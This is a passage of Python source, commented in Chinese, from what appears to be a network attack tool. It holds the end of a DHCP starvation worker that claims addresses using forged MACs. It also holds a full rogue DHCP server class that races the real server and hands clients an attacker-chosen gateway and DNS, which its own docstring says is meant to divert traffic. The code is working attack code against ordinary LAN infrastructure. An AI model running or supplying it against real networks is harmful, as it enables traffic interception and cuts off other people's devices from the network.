    def _start_sniffer(self) -> bool:
        try:
            from scapy.all import AsyncSniffer
            self._sniffer = AsyncSniffer(
                iface=self.iface.l2_name or None,
                filter=f"udp port {DHCP_SERVER_PORT} or udp port {DHCP_CLIENT_PORT}",
                prn=self._handle, store=False)
            self._sniffer.start()
            return True
        except Exception as exc:
            self._sniffer = None
            log(f"DHCP 应答嗅探启动失败（不影响发包）：{type(exc).__name__}: {exc}",
                "debug", "dhcp")
            return False

    def _stop_sniffer(self) -> None:
        if self._sniffer is not None:
            try:
                self._sniffer.stop()
            except Exception:
                pass
            self._sniffer = None

    def _handle(self, pkt) -> None:
        try:
            info = parse_dhcp(pkt)
            if not info:
                return
            xid = info["xid"]
            with self._lock:
                mine = self._tx.get(xid)
            if mine is None:
                return                                  # 不是我们发出去的，忽略
            kind = info["type_id"]
            if kind == OFFER:
                self.stats["offers"] += 1
                if not info["assigned_ip"]:
                    return
                with self._lock:
                    self._tx[xid]["server"] = info["server_ip"]
                for item in self._in_flight:
                    if item[1] == xid and not item[2]:
                        item[2] = info["assigned_ip"]
                        item[4] = time.time()
                        break
            elif kind == ACK:
                self.stats["acks"] += 1
                ip = info["assigned_ip"]
                if not ip or ip in self._taken:
                    return
                self._taken.add(ip)
                self.stats["taken"] = len(self._taken)
                lease = DhcpLease(client_mac=mine["mac"], requested_ip=ip,
                                  assigned_ip=ip, server_ip=info["server_ip"],
                                  hostname=info["hostname"], time=info["time"],
                                  msg_type="ACK")
                _record_once(self.records, lease)
                log(f"已占下 {ip}（伪造 MAC {mine['mac']}，来自 "
                    f"{info['server_ip'] or '?'}）", "success", "dhcp")
                if self.on_event:
                    try:
                        self.on_event(lease)
                    except Exception:
                        pass
        except Exception as exc:
            self.stats["errors"] += 1
            log(f"DHCP 应答处理出错：{type(exc).__name__}: {exc}", "debug", "dhcp")


# 放在类体后面初始化：`_in_flight` 是可变默认值，写在 __init__ 里更直观，
# 这里额外给一个类级兜底，防止有人绕过 __init__ 直接调 _tick（子类化场景）。


# --------------------------------------------------------------------------- #
# ③ 假 DHCP 服务器
# --------------------------------------------------------------------------- #

class RogueDhcp(threading.Thread):
    """
    **主动**假 DHCP 服务器：抢在真服务器之前回 OFFER / ACK，
    把我们指定的网关、DNS、网段发出去。

    参数
    ----
    iface    : core.hostinfo.Iface（server_ip 一般是它自己的 IP）
    pool     : 要发出去的地址池，如 "192.168.50.100-200"（见 parse_pool）
    gateway  : 发给客户端的默认网关（想引流就填本机 IP）
    dns      : 发给客户端的 DNS 列表（想引流就填本机 IP）
    server_ip: 我们自称的服务器地址（留空则用网卡自己的 IP）
    lease_time: 租期（秒）。故意给得短一点：停止后客户端几秒内就会重新要地址，
              真服务器就能把它们接管回去。
    mask     : 发给客户端的子网掩码

    ⚠ 这会直接改变别的设备的网络配置，可能让整个 LAN 上不了网。
    """

    def __init__(self, iface: Iface, pool: str = DEFAULT_POOL, gateway: str = "",
                 dns: list[str] | None = None, server_ip: str = "",
                 lease_time: int = DEFAULT_LEASE_TIME, mask: str = DEFAULT_MASK,
                 on_event=None) -> None:
        super().__init__(daemon=True, name="RogueDhcp")
        self.iface = iface
        self.pool = parse_pool(pool)               # 写法不对就直接抛 ValueError，界面提前拦
        self.gateway = (gateway or "").strip()
        self.dns = [ip.strip() for ip in (dns or []) if _is_ip(ip)]
        self.server_ip = (server_ip or "").strip() or (iface.ip or "")
        self.lease_time = max(30, int(lease_time))
        self.mask = mask if _is_ip(mask) else DEFAULT_MASK
        self.on_event = on_event
        self._stop_evt = threading.Event()
        self._sniffer = None
        self._lock = threading.Lock()
        self.stats = {"running": False, "seen": 0, "offered": 0, "acked": 0,
                      "errors": 0, "last_error": "", "started_at": 0.0,
                      "pool_size": len(self.pool)}
        self._leases: dict[str, str] = {}          # {MAC: IP}
        self.records: list[DhcpLease] = []
        self.our_mac = resolve_own_mac(iface)

    @property
    def clients(self) -> int:
        """已经拿过我们租约的设备数（直接由租约表算出来，不会和界面显示跑偏）。"""
        return len(self._leases)

    # ---------------- 线程 ----------------

    def run(self) -> None:
        ok, reason = dhcp_available(need_send=True)
        if not ok:
            self.stats["last_error"] = reason
            log(f"假 DHCP 服务器无法启动：{reason}", "error", "dhcp")
            return
        if not has_usable_mac(self.our_mac):
            self.stats["last_error"] = "拿不到本机网卡 MAC（回包会被丢弃）"
            log(f"假 DHCP 服务器无法启动：{self.stats['last_error']}", "error", "dhcp")
            return
        if not _is_ip(self.server_ip):
            self.stats["last_error"] = f"服务器地址不合法：{self.server_ip!r}"
            log(f"假 DHCP 服务器无法启动：{self.stats['last_error']}", "error", "dhcp")
            return
        try:
            from scapy.all import AsyncSniffer
            self._sniffer = AsyncSniffer(
                iface=self.iface.l2_name or None,
                filter=f"udp port {DHCP_SERVER_PORT} or udp port {DHCP_CLIENT_PORT}",
                prn=self._handle, store=False)
            self._sniffer.start()
        except Exception as exc:
            self.stats["last_error"] = f"{type(exc).__name__}: {exc}"
            log(f"假 DHCP 服务器启动失败（需要管理员 + Npcap）："
                f"{self.stats['last_error']}", "error", "dhcp")
            return

        self.stats["running"] = True
        self.stats["started_at"] = time.time()
        log(f"假 DHCP 服务器已启动：{self.server_ip} · 地址池 {len(self.pool)} 个 "
            f"({self.pool[0]}~{self.pool[-1]}) · 网关 {self.gateway or '(不发)'} · "
            f"DNS {', '.join(self.dns) or '(不发)'} · 租期 {self.lease_time}s",
            "warn", "dhcp")
        log("⚠ 这个网段里的设备会拿到我们发的配置，可能整个 LAN 上不了网", "warn", "dhcp")

        while not self._stop_evt.is_set():
            self._stop_evt.wait(0.2)

        try:
            self._sniffer.stop()
        except Exception:
            pass
        self._sniffer = None
        self.stats["running"] = False
        log(f"假 DHCP 服务器已停止：回应 {self.stats['offered']} 个 OFFER / "
            f"{self.stats['acked']} 个 ACK · {self.clients} 台设备拿了我们的租约",
            "info", "dhcp")
        log(f"提示：这些设备要等租期（{self.lease_time}s）到期、或重新要地址时，"
            f"才会回到真正的 DHCP 服务器", "debug", "dhcp")

    def stop(self, timeout: float = 2.5) -> None:
        """停止（不发任何「撤销」报文：DHCP 没有这类报文，只能靠租期自然过期）。"""
        self._stop_evt.set()
        if self.is_alive():
            self.join(timeout=timeout)
        self.stats["running"] = False

    # ---------------- 处理 ----------------

    def _pick_ip(self, mac: str) -> str:
        """
        给这台设备挑一个地址：已经发过的保持不动（续租），没发过的挑池子里
        第一个没被占的；池子满了返回空串（不再回答，免得两个设备撞地址）。
        """
        with self._lock:
            got = self._leases.get(mac)
            if got:
                return got
            used = set(self._leases.values())
            for ip in self.pool:
                if ip not in used:
                    self._leases[mac] = ip
                    return ip
        return ""

    def _handle(self, pkt) -> None:
        try:
            info = parse_dhcp(pkt)
            if not info:
                return
            if info["type_id"] not in (DISCOVER, REQUEST):
                return                                   # 只看客户端发来的
            mac = info["client_mac"]
            if not has_usable_mac(mac):
                return
            if mac == (self.our_mac or "").lower():
                return                                   # 自己发的包别回自己
            self.stats["seen"] += 1

            offered = self._pick_ip(mac)
            if not offered:
                log(f"地址池已满，不再回应 {mac}", "warn", "dhcp")
                return

            xid = info["xid"]
            if info["type_id"] == DISCOVER:
                from .rawsock import send_packets
                pkt_out = build_offer(mac, xid, offered, self.server_ip, self.our_mac,
                                      self.mask, self.gateway, self.dns,
                                      self.lease_time, info["hostname"])
                if send_packets([pkt_out], self.iface.l2_name or ""):
                    self.stats["offered"] += 1
                    self._remember(mac, offered, info, "OFFER")
                    log(f"已 OFFER {offered} -> {mac}"
                        + (f"（{info['hostname']}）" if info["hostname"] else ""),
                        "info", "dhcp")
            else:
                from .rawsock import send_packets
                pkt_out = build_ack(mac, xid, offered, self.server_ip, self.our_mac,
                                    self.mask, self.gateway, self.dns,
                                    self.lease_time, info["hostname"])
                if send_packets([pkt_out], self.iface.l2_name or ""):
                    self.stats["acked"] += 1
                    self._remember(mac, offered, info, "ACK")
                    log(f"已 ACK {offered} -> {mac}"
                        f"（网关 {self.gateway or '-'} / DNS {', '.join(self.dns) or '-'}）",
                        "success", "dhcp")
        except Exception as exc:
            self.stats["errors"] += 1
            self.stats["last_error"] = f"{type(exc).__name__}: {exc}"
            log(f"假 DHCP 处理出错：{self.stats['last_error']}", "debug", "dhcp")

    def _remember(self, mac: str, ip: str, info: dict, kind: str) -> None:
        lease = DhcpLease(client_mac=mac, requested_ip=info["requested_ip"],
                          assigned_ip=ip, server_ip=self.server_ip,
                          hostname=info["hostname"], time=info["time"],
                          msg_type=kind)
        if not _record_once(self.records, lease):
            return
        if self.on_event:
            try:
                self.on_event(lease)
            except Exception:
                pass


# --------------------------------------------------------------------------- #
# 退出兜底
# --------------------------------------------------------------------------- #

_ACTIVE: list = []


def register(worker) -> None:
    """把在跑的 worker 记下来，程序退出时统一停掉（避免线程还在发包）。"""
    if worker not in _ACTIVE:
        _ACTIVE.append(worker)


def unregister(worker) -> None:
    if worker in _ACTIVE:
        _ACTIVE.remove(worker)


def stop_all() -> None:
    """程序退出时调用：把所有还活着的 DHCP worker 停掉，一个异常都不往外抛。"""
    for w in list(_ACTIVE):
        try:
            w.stop(timeout=2.0)
        except Exception as exc:
            log(f"退出时停止 {type(w).__name__} 出错（已忽略）："
                f"{type(exc).__name__}: {exc}", "warn", "dhcp")
    _ACTIVE.clear()
